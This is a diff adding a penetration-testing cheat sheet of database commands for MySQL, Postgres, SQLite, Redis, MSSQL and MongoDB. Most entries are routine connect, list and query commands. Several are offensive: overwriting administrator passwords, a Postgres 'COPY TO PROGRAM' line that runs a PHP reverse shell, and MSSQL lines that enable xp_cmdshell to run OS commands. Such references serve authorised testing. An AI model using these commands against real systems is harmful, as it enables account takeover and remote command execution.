@@ -1,0 +1,40 @@
+^sql cheatsheet:https://portswigger.net/web-security/sql-injection/cheat-sheet
+mysql (connect): mysql -h <target> -P <port> -u <user> -p <password>
+mysql (version): select version();
+mysql (user): select system_user();
+mysql (list DBs): show databases
+mysql (list DBs): use <database>;
+mysql (list tables): show tables;
+mysql (query):SELECT * FROM users;
+mysql (update):UPDATE administrators SET user_password='<password>' WHERE user_name='<user>';
+postgres (connect): psql -h <target> -p <port> -U <user> -d <db_name>
+postgres (list DBs):\l
+postgres Connect DB:\c <filename1>
+postgres (list tables):\dt
+postgres Query:SELECT * FROM users;
+postgres Update:UPDATE users SET password='<password>' WHERE username='<user>';
+postgres Reverse Shell:COPY (SELECT ") TO PROGRAM 'php /var/www/backend/default/uploads/php-reverse-shell.php';
+sqlite (connect):sqlite3 <filename1>
+sqlite (list tables):.tables
+sqlite Schema:.schema <filename1>
+sqlite Query:SELECT * FROM users;
+sqlite Exit:.exit
+redis (connect):redis-cli -h <target>
+redis Config Get:CONFIG GET dir
+redis Keys:KEYS *
+redis Get Key:GET <filename1>
+redis Set Key:SET <filename1> "<password>"
+redis Auth:AUTH <password>
+mssql (impacket local user): impacket-mssqlclient <user>:<password>@<target> -windows-auth
+mssql (version):SELECT @@version;
+mssql (sqsh connect): sqsh -S <target>:<port> -U <user> -P <password>
+mssql (list DBs):select name FROM master.dbo.sysdatabases
+mssql (list DBs):select name FROM sys.sysdatabases;
+mssql (list tables):select * FROM <database>.information_schema.tables
+mssql (list tables):select * from <database>.dbo.<table>;
+mssql Use DB:USE <database>
+mssql Query:SELECT * FROM users;
+mssql Update:UPDATE users SET password='<password>' WHERE username='<user>';
+mssql Enable xp_cmdshell:EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+mssql Execute Command:EXEC xp_cmdshell "<command>";
+mongodb (connect): mongosh —host <target>:<port>
